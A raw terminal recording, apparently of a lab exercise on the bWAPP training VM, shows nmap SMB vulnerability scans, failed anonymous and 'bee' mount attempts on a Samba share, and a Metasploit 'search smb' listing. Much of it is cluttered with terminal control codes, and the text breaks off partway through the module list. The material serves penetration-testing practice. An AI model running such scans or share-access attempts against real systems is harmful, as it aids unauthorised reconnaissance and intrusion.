[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@smb[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[5P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnmap  -p 139,445  10.10.10.7 --script smb-enum-users.nse,smb-enum-shares.nse[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse, [Ksmb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse,[K
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:30 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0015s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Pmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[C[C[1Pmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[C[C[1Pmb-vuln-webexec.nse[C[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[C[1Psmb-vuln-webexec.nse[C[C[C[1Psmb-vuln-webexec.nse[C[C[1Psmb-vuln-webexec.nse[C[1Psmb-vuln-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csm[1Pb-vuln-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csmb[1P-vuln-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csmb-[1Pvuln-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csmb-v[1Puln-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csmb-vu[1Pln-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cmb-vul[1Pn-webexec.nse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:30 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0015s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+
+Nmap done: 1 IP address (1 host up) scanned in 18.38 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C39,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln[1P-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C9,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-[1Pwebexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-w[1Pebexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-we[1Pbexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C
+
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:31 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0014s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+
+Nmap done: 1 IP address (1 host up) scanned in 18.38 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C[C5  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-web[1Pexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C5  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webe[1Pxec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webex[1Pec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C1  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C[C3  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C[C[C9  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C
+
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:32 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0015s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+
+Nmap done: 1 IP address (1 host up) scanned in 18.37 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C445
+
+[C[C[C[C[C[C[C[C[C[C[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [C[C[C[C[C[C[C[C[C139,445  10.10.10.7 --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-webexec.nse[C[C[Cregsvc-dos.nse,smb-vuln-webexec.nse[A[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [49Psudo mount -t cifs 10.10.10.7:/tmp /mnt/ 
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C//10.10.10.7/tmp /mnt/  -o username=' '[K[Knobody[1Pnobody
+[sudo] password for dinesh: 
+Password for nobody@//10.10.10.7/tmp:  (press TAB for no echo)                         
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=nobody
+Password for nobody@//10.10.10.7/tmp:  (press TAB for no echo)                         (no echo) 
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=nobody[K[K[K[K[K[Kbee
+Password for bee@//10.10.10.7/tmp:  (press TAB for no echo)                         ***
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=bee
+Password for bee@//10.10.10.7/tmp:  (press TAB for no echo)                         
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=bee
+Password for bee@//10.10.10.7/tmp:  (press TAB for no echo)                         (no echo) 
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ msfdb t[Ks[K[K[K[Kconsole 
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\                                                  
+[0m[36m[37mCall trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        [1mthe matrix has you[0m
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com[0m
+[0m
+
+       =[ [33mmetasploit v5.0.91-dev[0m                          ]
++ -- --=[ 2023 exploits - 1101 auxiliary - 343 post       ]
++ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Save the current environment with the [32msave[0m command, future console restarts will use this environment again
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use a[K[K[K[K[Ks[Ksearch smb
+[0m
+Matching Modules
+================
+
+   #    Name                                                            Disclosure Date  Rank       Check  Description
+   -    ----                                                            ---------------  ----       -----  -----------
+   0    auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   1    auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   2    auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
+   3    auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
+   4    auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal     No     Oracle [45mSMB[0m Relay Code Execution
+   5    auxiliary/admin/[45msmb[0m/check_dir_file                                               normal     No     [45mSMB[0m Scanner Check File/Directory Utility
+   6    auxiliary/admin/[45msmb[0m/delete_file                                                  normal     No     [45mSMB[0m File Delete Utility
+   7    auxiliary/admin/[45msmb[0m/download_file                                                normal     No     [45mSMB[0m File Download Utility
+   8    auxiliary/admin/[45msmb[0m/list_directory                                               normal     No     [45mSMB[0m Directory Listing Utility
+   9    auxiliary/admin/[45msmb[0m/ms17_010_command                            2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion [45mSMB[0m Remote Windows Command Execution
+   10   auxiliary/admin/[45msmb[0m/psexec_command                                               normal     No     Microsoft Windows Authenticated Administration Utility
+   11   auxiliary/admin/[45msmb[0m/psexec_ntdsgrab                                              normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   12   auxiliary/admin/[45msmb[0m/samba_symlink_traversal                                      normal     No     Samba Symlink Directory Traversal
+   13   auxiliary/admin/[45msmb[0m/upload_file                                                  normal     No     [45mSMB[0m File Upload Utility
+   14   auxiliary/admin/[45msmb[0m/webexec_command                                              normal     No     WebEx Remote Command Execution Utility
+   15   auxiliary/docx/word_unc_injector                                                 normal     No     Microsoft Word UNC Path Injector
+   16   auxiliary/dos/samba/read_nttrans_ea_list                                         normal     No     Samba read_nttrans_ea_list Integer Overflow
+   17   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     No     SAP SOAP EPS_DELETE_FILE File Deletion
+   18   auxiliary/dos/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_loris                                     2017-06-29       normal     No     [45mSMB[0mLoris NBSS Denial of Service
+   19   auxiliary/dos/windows/[45msmb[0m/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
